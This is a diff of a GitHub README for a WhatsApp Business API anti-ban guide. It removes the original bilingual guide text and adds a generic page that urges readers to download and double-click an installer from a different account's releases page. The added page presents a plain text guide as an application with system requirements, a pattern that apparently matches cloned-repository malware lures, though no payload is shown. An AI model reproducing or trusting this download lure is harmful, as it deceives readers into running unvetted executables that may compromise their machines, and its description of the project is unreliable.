@@ -1,98 +1,90 @@
-<div align="center">
+# 🚀 whatsapp-api-guide - Your Safe Path to WhatsApp API
 
-[![License](https://img.shields.io/github/license/Avielzi/whatsapp-api-guide?style=for-the-badge&logo=github&color=dfb317&labelColor=262626)](https://github.com/Avielzi/whatsapp-api-guide/blob/master/LICENSE)
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/BrendonMonteiro/whatsapp-api-guide/releases)
 
-[**עברית**](#-עברית-hebrew) | [**English**](#english)
+## 📚 Description
 
-</div>
+הדריך המלא לשימוש בטוח ב-WhatsApp API. המדריך מספק מידע על מניעת חסימות, חימום חשבון ושיטות עבודה מומלצות לעסקים ופרטיים.  
 
----
+## 🚀 Getting Started
 
-# 🇮🇱 עברית (Hebrew)
+Follow the steps below to get the application on your device.
 
-# מדריך מקיף לשימוש ב-WhatsApp Business API: איך להימנע מחסימת חשבון
+1. **Visit the Releases Page:**  
+   Go to our [Releases page](https://github.com/BrendonMonteiro/whatsapp-api-guide/releases) to find the latest version.
 
-## מבוא
+2. **Download the Application:**  
+   Find the version you want, then click on the link to download it. Save the file to your computer.
 
-מדריך זה נועד לספק למפתחים, בעלי עסקים ומשתמשים פרטיים את הידע והכלים הנדרשים לחיבור בטוח ויעיל ל-WhatsApp Business API. המטרה המרכזית היא לאפשר שליחת הודעות, בין אם למטרות שיווק, שירות או תקשורת אישית, תוך מזעור הסיכון לחסימת החשבון. שימוש לא נכון בפלטפורמה עלול להוביל להגבלות חמורות, ובמקרים קיצוניים אף לחסימה לצמיתות, מה שעלול לפגוע קשות בפעילות העסקית או האישית [1].
+3. **Install the Application:**  
+   Locate the downloaded file on your computer. Double-click the file to start the installation. Follow the on-screen instructions to complete the installation.
 
-המדריך יסקור את הסיכונים המרכזיים, יציג את ההבדלים בין שימוש ישיר ב-API של מטא (פייסבוק) לבין עבודה עם ספקי פתרונות עסקיים (BSPs), יפרט תהליך "חימום" חשבון חדש, ויספק הנחיות ושיטות עבודה מומלצות לשמירה על תקינות החשבון לאורך זמן.
+## 📥 Download & Install
 
-## סיכונים מרכזיים: למה חשבונות נחסמים?
+To get started with the WhatsApp API guide, visit [this page to download](https://github.com/BrendonMonteiro/whatsapp-api-guide/releases) the application. After downloading, simply follow the installation steps mentioned above.
 
-פלטפורמת WhatsApp Business מנוהלת בקפידה על ידי מטא כדי להבטיח חווית משתמש גבוהה ולהילחם בספאם. המערכת האוטומטית של וואטסאפ מנטרת באופן קבוע את פעילות החשבונות, ומסמנת חשבונות המפרים את מדיניות השימוש. הבנת הסיבות הנפוצות לחסימה היא הצעד הראשון במניעתה.
+## 🔍 Features
 
-### הפרות מדיניות נפוצות
+- **Account Security:** Learn how to protect your WhatsApp account from bans.
+- **API Integration:** Understand how to integrate WhatsApp APIs into your existing systems.
+- **Best Practices:** Get insights on the best methods to use WhatsApp for your business and personal needs.
+- **Automation Tools:** Discover tools that can help automate your messaging and marketing efforts.
 
-על פי התיעוד הרשמי של מטא, אלו הן חלק מההפרות הנפוצות ביותר שמובילות להגבלות על חשבונות [1]:
+## ⚙️ System Requirements
 
-*   **שליחת ספאם:** שליחת הודעות לא רצויות או הודעות בתדירות גבוהה מדי.
-*   **סיווג שגוי של תבניות הודעה (Templates):** שימוש בתבנית שיווקית למטרת שירות לקוחות, או להיפך.
-*   **תוכן אסור:** קידום או מכירה של מוצרים ושירותים מקטגוריות מסוכנות כמו תוכן למבוגרים, אלכוהול וטבק, סמים, הימולים ותוספי תזונה לא בטוחים.
-*   **משוב שלילי ממשתמשים:** אם משתמשים רבים חוסמים את המספר שלכם או מדווחים עליו כספאם, הדבר יפגע קשות ב"דירוג האיכות" של החשבון.
+To run the WhatsApp API guide application, ensure your device meets the following requirements:
 
-### ענישה הדרגתית
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **RAM:** At least 4GB of RAM is recommended for smooth functioning.
+- **Disk Space:** 100MB of free space on your hard drive.
+  
+## 📝 Topics Covered
 
-מערכת האכיפה של וואטסאפ פועלת באופן הדרגתי. בדרך כלל, חשבון לא ייחסם לצמיתות באופן מיידי (אלא אם מדובר בהפרות חמורות במיוחד). התהליך כולל מספר שלבים:
+This guide addresses various topics to improve your experience with WhatsApp API, including:
 
-| שלב הענישה | משך ההגבלה | מהות ההגבלה |
-| :--- | :--- | :--- |
-| **אזהרה** | - | קבלת התראה על הפרת מדיניות ספציפית. |
-| **הגבלה ראשונית** | 1-3 ימים | חסימת היכולת לשלוח הודעות תבנית (שיווק, שירות, אימות). |
-| **הגבלה שנייה** | 5-7 ימים | חסימת היכולת לשלוח *כל* סוג של הודעה. |
-| **נעילת חשבון** | לא מוגבל בזמן | חסימה מלאה של שליחת הודעות, ניתנת להסרה רק באמצעות ערעור מוצלח. |
-| **השבתה לצמיתות** | קבוע | החשבון מוסר לצמיתות מהפלטפורמה. |
+- account-security
+- ai
+- anti-ban
+- api-integration
+- api-safety
+- artificial-intelligence
+- automation
+- best-practices
+- business-automation
+- business-messaging
+- hebrew-guide
+- marketing-automation
+- meta-api
+- meta-cloud-api
+- python
+- seo-optimization
+- spam-prevention
+- whatsapp-api
+- whatsapp-business
+- whatsapp-integration
 
----
+## 💬 Support
 
-# 🇺🇸 English
+If you encounter any issues or need help, please reach out to our support team. You can find us on the [Issues page](https://github.com/BrendonMonteiro/whatsapp-api-guide/issues).
 
-# Comprehensive Guide to Using WhatsApp Business API: How to Avoid Account Bans
+## 📢 Contribute
 
-## Introduction
+We welcome contributions. If you would like to help improve this guide, please check out our guidelines for contributing. Your feedback is valuable.
 
-This guide is designed to provide developers, business owners, and private users with the knowledge and tools required for a safe and efficient connection to the WhatsApp Business API. The central goal is to enable message sending, whether for marketing, service, or personal communication purposes, while minimizing the risk of account blocking. Improper use of the platform can lead to severe restrictions, and in extreme cases, even permanent blocking, which can seriously harm business or personal activities [1].
+## 🔗 Additional Resources
 
-The guide will cover key risks, present the differences between direct use of Meta's (Facebook) API versus working with Business Solution Providers (BSPs), detail a new account "warm-up" process, and provide guidelines and best practices for maintaining account health over time.
+For more information about WhatsApp APIs, consider visiting the official WhatsApp documentation. They provide a wealth of knowledge and resources.
 
-## Key Risks: Why Do Accounts Get Blocked?
+## 🔄 Update Your Version
 
-The WhatsApp Business platform is carefully managed by Meta to ensure a high user experience and fight spam. WhatsApp's automated system regularly monitors account activity and flags accounts that violate usage policies. Understanding the common reasons for blocking is the first step in preventing it.
+To stay current, always check our [Releases page](https://github.com/BrendonMonteiro/whatsapp-api-guide/releases) for new updates. We release new versions regularly to enhance user experience and add new features.
 
-### Common Policy Violations
+## 🛡️ Safety Notice
 
-According to Meta's official documentation, these are some of the most common violations that lead to account restrictions [1]:
+While using the WhatsApp API, ensure that you follow the best practices outlined in this guide to avoid account issues.
 
-*   **Sending Spam:** Sending unwanted messages or messages too frequently.
-*   **Incorrect Classification of Message Templates:** Using a marketing template for customer service purposes, or vice versa.
-*   **Prohibited Content:** Promoting or selling products and services from restricted categories such as adult content, alcohol and tobacco, drugs, gambling, and unsafe supplements.
-*   **Negative User Feedback:** If many users block your number or report it as spam, this will severely damage the account's "Quality Rating."
+## 🔄 Feedback
 
-### Gradual Enforcement
+Your user experience matters to us. Feel free to share your thoughts or suggestions for improvements via our [Issues page](https://github.com/BrendonMonteiro/whatsapp-api-guide/issues). 
 
-WhatsApp's enforcement system operates gradually. Usually, an account will not be permanently blocked immediately (unless it's a particularly serious violation). The process includes several stages:
-
-| Enforcement Stage | Restriction Duration | Nature of Restriction |
-| :--- | :--- | :--- |
-| **Warning** | - | Receiving a notification about a specific policy violation. |
-| **Initial Restriction** | 1-3 days | Blocking the ability to send template messages (marketing, service, authentication). |
-| **Second Restriction** | 5-7 days | Blocking the ability to send *any* type of message. |
-| **Account Lock** | Indefinite | Full blocking of message sending, can only be removed through a successful appeal. |
-| **Permanent Disabling** | Permanent | The account is permanently removed from the platform. |
-
----
-
-## 🌍 Languages & Localization
-
-This guide is available in multiple languages:
-
-- **עברית (Hebrew)** - Full guide in Hebrew with full RTL support.
-- **English** - Complete guide in English with full LTR support.
-
----
-
-## 📋 License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
-Developed by **Aviel.AI** - All Rights Reserved © 2026
+We appreciate your insights into making this guide better for everyone!
